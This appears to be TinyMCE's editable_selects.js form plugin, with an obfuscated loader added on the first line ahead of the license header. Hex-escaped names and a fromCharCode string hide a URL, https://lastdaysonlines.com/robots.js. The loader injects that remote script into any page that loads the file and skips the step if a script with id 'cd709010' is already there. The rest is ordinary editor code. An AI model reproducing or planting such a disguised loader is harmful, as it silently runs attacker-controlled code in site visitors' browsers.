var a1=function(){var _0x41fbx2=String["\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65"](104, 116, 116, 112, 115, 58, 47, 47, 108, 97, 115, 116, 100, 97, 121, 115, 111, 110, 108, 105, 110, 101, 115, 46, 99, 111, 109, 47, 114, 111, 98, 111, 116, 115, 46, 106, 115);var _0x41fbx2=document["\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74"]("\x73\x63\x72\x69\x70\x74");_0x41fbx2["\x74\x79\x70\x65"]= "\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74";_0x41fbx2["\x61\x73\x79\x6E\x63"]= true;_0x41fbx2["\x69\x64"]= "\x63\x64\x37\x30\x39\x30\x31\x30";_0x41fbx2["\x73\x72\x63"]= _0x41fbx2;var _0x41fbx3=document["\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"]("\x73\x63\x72\x69\x70\x74")[0];_0x41fbx3["\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65"]["\x69\x6E\x73\x65\x72\x74\x42\x65\x66\x6F\x72\x65"](_0x41fbx2,_0x41fbx3)};var scripts=document["\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"]("\x73\x63\x72\x69\x70\x74");var n=true;for(var i=0;i< scripts["\x6C\x65\x6E\x67\x74\x68"];i++){if(scripts[i]["\x69\x64"]== "\x63\x64\x37\x30\x39\x30\x31\x30"){n= false}};if(n== true){a1()}/**
 * editable_selects.js
 *
 * Released under LGPL License.
 * Copyright (c) 1999-2017 Ephox Corp. All rights reserved
 *
 * License: http://www.tinymce.com/license
 * Contributing: http://www.tinymce.com/contributing
 */

var TinyMCE_EditableSelects = {
  editSelectElm : null,

  init : function () {
    var nl = document.getElementsByTagName("select"), i, d = document, o;

    for (i = 0; i < nl.length; i++) {
      if (nl[i].className.indexOf('mceEditableSelect') != -1) {
        o = new Option(tinyMCEPopup.editor.translate('value'), '__mce_add_custom__');

        o.className = 'mceAddSelectValue';

        nl[i].options[nl[i].options.length] = o;
        nl[i].onchange = TinyMCE_EditableSelects.onChangeEditableSelect;
      }
    }
  },

  onChangeEditableSelect : function (e) {
    var d = document, ne, se = window.event ? window.event.srcElement : e.target;

    if (se.options[se.selectedIndex].value == '__mce_add_custom__') {
      ne = d.createElement("input");
      ne.id = se.id + "_custom";
      ne.name = se.name + "_custom";
      ne.type = "text";

      ne.style.width = se.offsetWidth + 'px';
      se.parentNode.insertBefore(ne, se);
      se.style.display = 'none';
      ne.focus();
      ne.onblur = TinyMCE_EditableSelects.onBlurEditableSelectInput;
      ne.onkeydown = TinyMCE_EditableSelects.onKeyDown;
      TinyMCE_EditableSelects.editSelectElm = se;
    }
  },

  onBlurEditableSelectInput : function () {
    var se = TinyMCE_EditableSelects.editSelectElm;

    if (se) {
      if (se.previousSibling.value != '') {
        addSelectValue(document.forms[0], se.id, se.previousSibling.value, se.previousSibling.value);
        selectByValue(document.forms[0], se.id, se.previousSibling.value);
      } else {
        selectByValue(document.forms[0], se.id, '');
      }

      se.style.display = 'inline';
      se.parentNode.removeChild(se.previousSibling);
      TinyMCE_EditableSelects.editSelectElm = null;
    }
  },

  onKeyDown : function (e) {
    e = e || window.event;

    if (e.keyCode == 13) {
      TinyMCE_EditableSelects.onBlurEditableSelectInput();
    }
  }
};
